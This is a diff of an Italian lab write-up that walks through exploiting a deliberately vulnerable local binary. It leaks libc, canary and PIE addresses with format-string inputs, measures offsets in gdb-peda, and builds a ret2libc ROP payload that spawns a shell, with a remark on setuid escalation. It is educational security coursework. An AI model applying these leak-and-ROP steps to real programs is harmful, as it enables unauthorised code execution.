@@ -48,13 +48,11 @@ Il file è un ELF a 64-bit little-endian, dynamically linked.
 
 Il target è un eseguibile che è stato compilato con gcc con le protezioni attivate come da default:
 
-<style>g { color: green; text-weight: bold; }</style>
-
 <pre>
 vincenzo@UbuntuZsh:~/Desktop/software-security-project$ checksec vuln
 [*] '/home/vincenzo/Desktop/software-security-project/vuln'
     Arch:     amd64-64-little
-    RELRO:    <g>Full RELRO</g>
+    RELRO:    <span style="color:green;font-weight:bold">Full RELRO</span>
     Stack:    <span style="color:green;font-weight:bold">Canary found</span>
     NX:       <span style="color:green;font-weight:bold">NX enabled</span>
     PIE:      <span style="color:green;font-weight:bold">PIE enabled</span>
@@ -108,8 +106,6 @@ int main(int argc, const char **argv)
 }
 ```
 
-Vediamo nel programma anche un esplicito inserimento dell'istruzione assembly "pop rdi; ret" che tuttavia non è stata sfruttata. E' comunque comune, in programmi di dimensioni maggiori, trovarla "naturalmente" nel programma e come vedremo è un'istruzione utile negli attacchi a 64 bit.
-
 ### Breve analisi iniziale
 
 Dobbiamo sfruttare il primo inserimento per "curiosare" nello stack e comprendere cosa si trova dopo ad esso. Siccome vogliamo che il programma non termini improvvisamente con un'eccezione mandiamo vogliamo rimanere entro i 16 caratteri per il primo input, per farci un'idea di una ventina di posizioni possiamo quindi eseguire venti volte il programma inviando il comando per leggere una sola posizione ogni volta.
@@ -147,23 +143,23 @@ I commenti a destra di alcune righe sono stati aggiunti a posteriori a mano, gua
 ## Libc leak
 
 Siccome ASLR è attivo la posizione della libreria libc in memoria può variare ad ogni esecuzione, dobbiamo quindi rilevarla per poterci riferire correttamente a parti di essa necessarie per l'attacco.
-Nei dati che abbiamo visto nell'analisi iniziale ci sono diversi indirizzi che sembrano appartenere a libc. Possiamo scegliere uno di questi, ad esempio il 3, rieseguire il codice in gbd e prendere nota dell'indirizzo preso con `%3\$lx`. Eseguendo il gdb il comando vmmap controlliamo qual é l'indirizzo di partenza della libreria libc e calcoliamo l'offset: questo offset sarà lo stesso ad ogni esecuzione e ci permetterà quindi di calcolare ad ogni esecuzione l'indirizzo di inizio di libc per quella specifica esecuzione.
+Nei dati che abbiamo visto nell'analisi iniziale ci sono diversi indirizzi che sembrano appartenere a libc. Possiamo scegliere uno di questi, ad esempio il 3. Rieseguiamo il codice in gbd e prendiamo nota dell'indirizzo che otteniamo inserendo nel primo input `%3\$lx`. Eseguiamo poi in gdb il comando vmmap e controlliamo qual é l'indirizzo di partenza della libreria libc, così da calcolarne l'offset: questo offset sarà lo stesso ad ogni esecuzione e ci permetterà quindi di calcolare ad ogni esecuzione l'indirizzo di inizio di libc per quella specifica esecuzione.
 
 ## Canary leak
 
-Quando abbiamo parlato dell'analisi iniziale abbiamo anticipato che alcuni input sembrano valori casuali e potrebbero essere canarini. Uno di questi, in particolare, termina con \00 e come detto i canarini sui sistemi linux terminano sembre con tale byte.
+Quando abbiamo parlato dell'analisi iniziale abbiamo anticipato che alcuni input sembrano valori casuali e potrebbero essere canarini. Uno di questi, in particolare, termina con `\00` e come detto i canarini sui sistemi linux terminano sempre con tale byte. Se così non fosse potremmo comunque provare tutti i valori che sembrano casuali fino a trovare il canarino.
 
-Se usiamo GDB e disassembliamo il main troviamo verso la fine queste istruzioni:
+Se usiamo GDB e disassembliamo la funzione main troviamo verso la fine queste istruzioni:
 
 ```
-   0x555555555255 <main+159>:	mov    eax,0x0
-   0x55555555525a <main+164>:	mov    rdx,QWORD PTR [rbp-0x8]
-=> 0x55555555525e <main+168>:	sub    rdx,QWORD PTR fs:0x28
-   0x555555555267 <main+177>:	je     0x55555555526e <main+184>
-   0x555555555269 <main+179>:	call   0x555555555090 <__stack_chk_fail@plt>
+   0x0000000000001248 <+159>:	mov    eax,0x0
+   0x000000000000124d <+164>:	mov    rdx,QWORD PTR [rbp-0x8]
+=> 0x0000000000001251 <+168>:	sub    rdx,QWORD PTR fs:0x28
+   0x000000000000125a <+177>:	je     0x1261 <main+184>
+   0x000000000000125c <+179>:	call   0x1090 <__stack_chk_fail@plt>
 ```
 
-Vediamo che è presente un'istruzione che lancia l'eccezione di buffer overflow, si tratta della call a __stack_chk_fail e vediamo che la condizione che ne influenza l'esecuzione si basa sul registro RDX. Possiamo quindi lanciare l'eseguibile nel debugger, farci dare l'undicesimo valore inserendo nel primo input `%11$lx`, proseguire fino al punto di verifica del canarino e controllare se il valore presente in rdx corrisponde al valore ottenuto dall'input. Nel nostro caso coincide quindi il canarino è proprio tale valore.
+Vediamo che è presente un'istruzione che lancia l'eccezione di buffer overflow, si tratta della call a ___stack_chk_fail_ e vediamo che la condizione che ne influenza l'esecuzione si basa sul registro RDX. Possiamo quindi lanciare l'eseguibile nel debugger, farci dare l'undicesimo valore inserendo nel primo input `%11$lx`, proseguire fino al punto di verifica del canarino e controllare se il valore presente in rdx corrisponde al valore ottenuto dall'input. Nel nostro caso coincide quindi il canarino è proprio tale valore.
 
 ## Binary Base Leak (PIE)
 [Titolo alternativo: ## Position-Independent Executable (PIE)]
@@ -172,14 +168,15 @@ Anche se non è necessario per il nostro attacco, è possibile ottenere il base 
 ```
 gdb-peda$ vmmap
 Start              End                Perm	Name
-0x0000555555554000 0x0000555555555000 r--p	/home/vincenzo/Desktop/swsec_1/vuln
-0x0000555555555000 0x0000555555556000 r-xp	/home/vincenzo/Desktop/swsec_1/vuln
-0x0000555555556000 0x0000555555557000 r--p	/home/vincenzo/Desktop/swsec_1/vuln
-0x0000555555557000 0x0000555555558000 r--p	/home/vincenzo/Desktop/swsec_1/vuln
-0x0000555555558000 0x0000555555559000 rw-p	/home/vincenzo/Desktop/swsec_1/vuln
+0x0000555555554000 0x0000555555555000 r--p	/home/vincenzo/Desktop/software-security-project/vuln
+0x0000555555555000 0x0000555555556000 r-xp	/home/vincenzo/Desktop/software-security-project/vuln
+0x0000555555556000 0x0000555555557000 r--p	/home/vincenzo/Desktop/software-security-project/vuln
+0x0000555555557000 0x0000555555558000 r--p	/home/vincenzo/Desktop/software-security-project/vuln
+0x0000555555558000 0x0000555555559000 rw-p	/home/vincenzo/Desktop/software-security-project/vuln
+[Alcune righe omesse]
 ```
 
-Se il valore ottenuto da %5&lx è 0x5555555596b0 e le istruzioni dell'eseguibile sono allocate a partire dall'indirizzo 0x0000555555554000 l'offset è di `0x5555555596b0 - 0x0000555555554000 = 0x56B0`.
+Se il valore ottenuto da %5$lx è 0x5555555596b0 e le istruzioni dell'eseguibile sono allocate a partire dall'indirizzo 0x0000555555554000 l'offset è di `0x5555555596b0 - 0x0000555555554000 = 0x56B0`.
 
 ## Ultime informazioni necessarie
 
@@ -187,7 +184,7 @@ Abbiamo visto che con il primo input da inserire possiamo estrarre diverse infor
 
 ### Padding per il canarino
 
-Il metodo più comodo per sapere in che posizione va inserito il canarino è eseguire nuovamente il GDB l'applicazione, inserire una stringa breve nel primo input ed una lunga sequenza non ripetitiva di caratteri nel secondo input. Andiamo avanti di alcune istruzioni e ci portiamo ad appena prima del controllo del canarino. A questo punto copiamo il contenuto del registro RDX e lo cerchiamo all'interno della sequenza passata inizialmente, scoprendo così la posizione in cui il canarino deve trovarsi.
+Il metodo più comodo per sapere in che posizione va inserito il canarino è eseguire nuovamente in GDB l'applicazione, inserire una stringa breve nel primo input ed una lunga sequenza non ripetitiva di caratteri nel secondo input. Andiamo avanti di alcune istruzioni e ci portiamo ad appena prima del controllo del canarino. A questo punto copiamo il contenuto del registro RDX e lo cerchiamo all'interno della sequenza passata inizialmente, scoprendo così la posizione in cui il canarino deve trovarsi.
 
 Creiamo la sequenza:
 ```
@@ -203,9 +200,27 @@ gdb-peda$ pattern_offset (AADAA;A
 (AADAA;A found at offset: 24
 ```
 
+In alternativa al copiare manualmente il valore da RDX e cercarlo con pattern offset è possibile anche, sempre dopo essersi portati al punto in cui viene effettuato il controllo del canarino, eseguire una ricerca di tutti i pattern su registri, stack e quant'altro usando il comando `pattern search`:
+```
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+RDX+0 found at offset: 24
+Registers point to pattern buffer:
+[RSI] --> offset 1 - size ~65
+[RBP] --> offset 32 - size ~34
+Pattern buffer found at:
+0x00005555555596b0 : offset    0 - size   64 ([heap])
+References to pattern buffer found at:
+0x00007ffff7f9aab8 : 0x00005555555596b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007ffff7f9aac0 : 0x00005555555596b0 (/usr/lib/x86_64-linux-gnu/libc.so.6)
+0x00007fffffffdb38 : 0x00007fffffffdd70 ($sp + -0x228 [-138 dwords
+[Alcune righe rimosse]
+```
+Si può vedere infatti che è stato trovato, tra gli altri, un pezzo di pattern con offset 24 nel registro RDX.
+
 ### Padding per il return
 
-Trovata la posizione del canarino dobbiamo capire quanti altri caratteri inserire prima di raggiungere la posizione dell'istruzione di return. Per farlo eseguiamo lo script ret_offset.py che con il primo input scopre il valore del canarino e col secondo input invia un numero di caratteri sufficiente a riempire il buffer, seguito dal canarino, seguito dalla solita sequenza creata da gdb. Lo script, oltre ad inserire gli input, apre una sessione con gdb e ci permette di guardare registri, stack e quant'altro. Con il comando `pattern search` gdb cerca pezzi di pattern in tutte le posizioni e ci restituisce questo:
+Trovata la posizione del canarino dobbiamo capire quanti altri caratteri inserire prima di raggiungere la posizione dell'istruzione di return. Per farlo eseguiamo lo script ret_offset.py che con il primo input scopre il valore del canarino e col secondo input invia un numero di caratteri sufficiente a riempire il buffer, seguito dal canarino, seguito dalla solita sequenza creata da gdb. Lo script, oltre ad inserire gli input, apre una sessione con gdb e ci permette di guardare registri, stack e quant'altro. Con il comando `pattern search` usato poco fa gdb-peda ci restituisce questo:
 
 ```
 gdb-peda$ pattern search
@@ -214,10 +229,10 @@ RBP+0 found at offset: 0
 Registers point to pattern buffer:
 [RSP] --> offset 8 - size ~58
 Pattern buffer found at:
-0x00005555555596d0 : offset    0 - size   64 ([heap])
-0x00007fffffffde20 : offset    0 - size   64 ($sp + -0x8 [-2 dwords])
+0x0000555d3c6f86d0 : offset    0 - size   64 ([heap])
+0x00007fffb40c2960 : offset    0 - size   64 ($sp + -0x8 [-2 dwords])
 References to pattern buffer found at:
-0x00007fffffffddc8 : 0x00007fffffffde20 ($sp + -0x60 [-24 dwords])
+0x00007fffb40c2908 : 0x00007fffb40c2960 ($sp + -0x60 [-24 dwords])
 ```
 
 La riga che ci interessa è quella relativa a [RSP] dove vediamo un offset pari a 8: quella è la lunghezza del secondo blocco di caratteri junk che dobbiamo inserire per arrivare a sovrascrivere il ret:
@@ -225,7 +240,7 @@ La riga che ci interessa è quella relativa a [RSP] dove vediamo un offset pari 
 
 ## Exploitation
 
-Il nostro obiettivo finale è riuscire ad eseguire `system("/bin/sh")`, per fare questo, e non potendo iniettare codice nello stack per eseguirlo a causa della protezione *Non-eXecutable stack*, dobbiamo trovare delle istruzioni da sfruttare già presenti nel codice in esecuzione. Siccome ci troviamo su un sistema a 64 bit i parametri vengono passati alla funzione non tramite lo stack ma tramite i registri. La funzione system si aspetta il primo parametro nel registro RDI e dobbiamo quindi trovare da qualche parte nel codice la stringa /bin/sh e riuscire ad inserirla nel registro RDI. Dopodichè possiamo eseguire system, che andrà a leggere RDI ed eseguirà la shell.
+Il nostro obiettivo finale è riuscire ad eseguire `system("/bin/sh")`, per fare questo, e non potendo iniettare codice nello stack per eseguirlo a causa della protezione *Non-eXecutable stack*, dobbiamo trovare delle istruzioni da sfruttare già presenti nel codice in esecuzione. Siccome ci troviamo su un sistema a 64 bit i parametri vengono passati alla funzione non tramite lo stack ma tramite i registri. La funzione system si aspetta il primo parametro nel registro RDI e dobbiamo quindi trovare da qualche parte nel codice la stringa _/bin/sh_ e riuscire ad inserirla nel registro RDI. Dopodichè possiamo eseguire system, che andrà a leggere RDI ed eseguirà la shell.
 
 Il nostro payload diventa quindi:
 'A'* 24 + canary + 'B'* 8 + POP_RDI + BIN_SH_ADDRESS + SYSTEM_ADDRESS
@@ -244,15 +259,23 @@ vincenzo@swsec-VirtualBox:~/Desktop/swsec_1$ ROPgadget --binary /usr/lib/x86_64-
 0x00000000001bc10d : pop rdi ; ret 0xffe6
 0x000000000008eef5 : pop rdi ; retf
 0x00000000000538c3 : pop rdi ; sbb al, 0 ; jmp 0x5387d
+[Molte righe rimosse]
 ```
 
-La lista di risultati è molto più lunga ma abbiamo omesso la maggior parte delle righe. La riga che ci interessa, in ogni caso, è questa:
+La lista di risultati è molto più lunga ma ho omesso la maggior parte delle righe. La riga che ci interessa, in ogni caso, è questa:
 ```
 0x000000000002a3e5 : pop rdi ; ret
 ```
 
-Se l'attacco non funziona ancora può essere a causa di un disallineamento. Provandolo si vede infatti il programma crashare sull'istruzione _movaps XMMWORD PTR [rsp],xmm0_ con un SIGSEGV, ovvero un segmentation fault. Questo è dovuto alle specifiche _System V Application Binary Interface_ (usato tra gli altri da Linux e di cui ELF è parte) che un allineamento dello stack a 16-byte prima di una call.
+Se l'attacco non funziona ancora può essere a causa di un disallineamento. Provandolo si vede infatti il programma crashare sull'istruzione _movaps XMMWORD PTR [rsp],xmm0_ con un SIGSEGV, ovvero un errore di segmentation fault. Questo è dovuto alle specifiche _System V Application Binary Interface_ (standard usato tra gli altri da Linux e di cui ELF è parte) che impongono un allineamento dello stack a 16-byte prima di una call.
 Per risolvere possiamo aggiungere un'istruzione di ret che provoca il pop di 8 byte dalla cima dello stack sistemando così l'allineamento. Anche l'istruzione ret può essere trovata all'interno di libc, nello stesso modo di _pop rdi_.
 
 Il nostro payload ora è questo:
-'A'* 24 + canary + 'B'* 8 + POP_RDI + BIN_SH_ADDRESS + RET+ SYSTEM_ADDRESS
+'A'* 24 + canary + 'B'* 8 + POP_RDI + BIN_SH_ADDRESS + RET + SYSTEM_ADDRESS
+
+Il file _attack_v2.py_ riporta l'attacco completo che abbiamo costruito fin qui e mostra una shell come risultato. Nello script, a differenza di quanto visto in questa descrizione, stringhe e funzioni interne a libc sono state indicate non tramite il loro indirizzo esplicito ma utilizzando l'oggetto ELF della libreria python pwntools, assegnandogli il base address trovato tramite il leak descritto ed ottenendo gli indirizzi corretti per _system_ e per _/bin/sh_.
+
+## Conclusioni e possibili miglioramenti
+
+Abbiamo visto come aprire una shell utilizzando un programma con uno scopo completamente differente. L'attacco potrebbe diventare più efficace tentando una _privilege escalation_ tramite una chiamata al metodo *setuid*, anch'esso presente in libc.
+Per poterlo fare dobbiamo però prima riuscire ad azzerare due registri contenenti i parametri per la chiamata da effettuare, non è possibile passare `\00` più volte in input in quanto la funzione _gets_ presente nell'eseguibile attaccato interrompe la copia dell'input alla prima occorrenza di `\00`, di un `EOF` o di `\n`. Bisogna quindi trovare all'interno di libc le operazioni necessarie ad ottenere tale azzeramento dei registri, chiamare poi setuid ed infine _system_ con _/bin/sh_ come abbiamo fatto. Nel caso la shell di default del sistema attaccato sia bash questo è comunque poco utile in quanto bash droppa i privilegi automaticamente all'avvio nel caso essi siano stato impostati con setuid prima della sua apertura.
